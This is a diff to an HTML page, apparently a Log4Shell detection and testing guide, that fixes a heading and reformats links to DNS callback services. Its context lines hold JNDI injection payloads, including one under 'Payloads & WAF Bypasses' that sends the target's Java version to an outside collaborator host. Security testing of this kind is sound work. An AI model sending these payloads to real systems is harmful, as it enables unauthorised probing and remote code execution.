@@ -197,7 +197,7 @@
                    </script>
                     </div><br />
                     
-                   <h2>2. How to works ( Detection )</h2>
+                   <h2>2. How it works ( Detection )</h2>
                      <p> 
 1. An attacker inserts the JNDI lookup/payload in a anywhere of request that is likely to be logged. (for instance: `${jndi:ldap://domain.com/j}`)<br>
 2. The payload is passed to log4j for logging.<br>
@@ -207,13 +207,15 @@
                     </p>
                  <h2>3. Simple DNS Log Monitor Services</h2>
  <p> 
-1. - [canarytokens](https://canarytokens.org/generate)<br>
-2. - [ceye](http://ceye.io/)<br>
-3. - [dnslog](https://log.xn--9tr.com/)<br>
-4. - [requestbin](https://requestbin.net/)<br>
-5. - [burp collaborator](https://portswigger.net/burp/documentation/collaborator)<br>
-6. - [run your own dns servers](https://www.joshmcguigan.com/blog/run-your-own-dns-servers/)<br>
+1. - <a href="https://canarytokens.org/generate">[canarytokens]</a><br>
+2. - <a href="http://ceye.io/">[ceye]</a><br>
+3. - <a href="https://log.xn--9tr.com/">[dnslog]</a><br>
+4. - <a href="https://requestbin.net/">[requestbin]</a><br>
+5. - <a href="https://portswigger.net/burp/documentation/collaborator">[burp collaborator]</a><br>
+6. - <a href="https://www.joshmcguigan.com/blog/run-your-own-dns-servers/">[run your own dns servers]</a><br>
                     </p><br>
+                   <h2>4. Steps to reproduce</h2> 
+                    
 <h2>Payloads & WAF Bypasses</h2>
 <pre><code>Want to know the Java version running on the target?<br>
 ${jndi:ldap://${sys:java.version}.collaborator.com}
